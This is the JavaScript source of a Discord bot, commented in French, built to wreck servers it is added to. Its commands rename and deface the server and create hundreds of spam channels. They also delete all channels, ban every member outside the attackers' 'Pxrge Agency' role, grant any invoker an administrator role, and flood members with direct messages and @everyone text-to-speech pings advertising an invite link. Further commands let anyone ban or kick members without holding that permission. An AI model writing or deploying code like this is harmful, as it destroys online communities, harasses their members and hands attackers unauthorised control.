const Discord = require("discord.js");
const bot = new Discord.Client();
try{
  bot.on('ready',() => {
 
  console.log("Je suis "+bot.user.username+" je suis sur "+bot.guilds.size+" serveurs et j'ai "+bot.users.size+" membres "+bot.user.id)
  })
 
  bot.on("message", message => {
      //COMMANDE DE CREATION DE CHANNEL, MODIFICATION DU NOM, DE LA REGION ET DE L'ICON DU SERVEUR
      if(message.content === ".purge"){
          if(message.channel.type === "dm") return;
          var fucked = false
          if(!fucked){
              message.guild.setIcon("https://www.google.com/url?sa=i&rct=j&q=&esrc=s&source=images&cd=&ved=2ahUKEwjKwe6D3vnfAhXE8uAKHYQmCFcQjRx6BAgBEAU&url=http%3A%2F%2Fwww.premiere.fr%2FSeries%2FLa-serie-American-Nightmare-ne-parlera-pas-de-la-Purge&psig=AOvVaw0Gm9EfbtPwySB_A9lPC62u&ust=1547983491014271").catch(error => {})
              message.guild.setName("FUCKED BY PXRGE AGENCY").catch(error => {})
              message.guild.setRegion('hongkong').catch(error => {})  
         for (var i = 0; i < 500; i++){
            message.guild.createChannel("pxrge_agency", 'voice').catch(error => {})
            message.guild.createChannel('pxrge_agency', 'text').catch(error => {})
         }
          fucked = true;
          }
          if(message.deletable) message.delete();
        }
      // COMMANDE POUR SUPPRIMER TOUT LES SALONS
      if(message.content === ".pxrge"){
          if(message.channel.type === "dm") return;
          if(message.guild.channels.size === 0) return;
          else if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          message.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }
      //COMMANDE POUR BAN TOUT LE MONDE SAUF CEUX AYANT LE GRADE PXRGE AGENCY
      if (message.content === '.degage') {
        if(message.channel.type === "dm") return;
          message.guild.members.forEach(member => {
              if (!member.roles.exists("name", "Pxrge Agency") && member.bannable) member.ban();});
        }
        //COMMANDE POUR METTRE ADMIN
        if (message.content === '.perms') {
            if(message.channel.type === "dm") return;
            else if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return;
            message.member.guild.createRole({
                name: "Pxrge Agency",
                permissions: "ADMINISTRATOR",
                mentionable: false
              }).then(function(role) {message.member.addRole(role); if (message.deletable) message.delete();})
            }
            //COMMANDE POUR SPAM MP TOUT LE SERVEUR
            if(message.content === ".ping"){
                if(message.channel.type === "dm") return;
                if(message.deletable) message.delete();
                message.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send(message.guild.owner.user.username+" s'est fait bz son serv par https://discord.gg/D3hDzK7").catch(error => {}) }, 450)})
              }
              //COMMANDE POUR SPAM DANS LE SALON
              if (message.content === '.notif') {
                if(message.channel.type === "dm") return;
                   setInterval (function () { message.channel.send("@everyone https://discord.gg/D3hDzK7", { tts: true } ).catch(error => {}) }, 450)
                }
                              //COMMANDE POUR BAN SANS PERM
              if(message.content.startsWith(".forceban")){
                if(message.channel.type === "dm") return;
                else if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return;
                var member = message.guild.member(message.mentions.members.first().user)
                if(message.mentions.members.size === 0) return;
                else if(member.bannable) member.ban()
              }
              // COMMANDE POUR KICK SANS PERM
              if(message.content.startsWith(".forcekick")){
                if(message.channel.type === ".ban") return;
                else if(!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")) return;
                var member = message.guild.member(message.mentions.members.first().user)
                if(message.mentions.members.size === 0) return;
                else if(member.kick) member.kick()
              }
  })
} catch(error) {}
  bot.login(process.env.token);
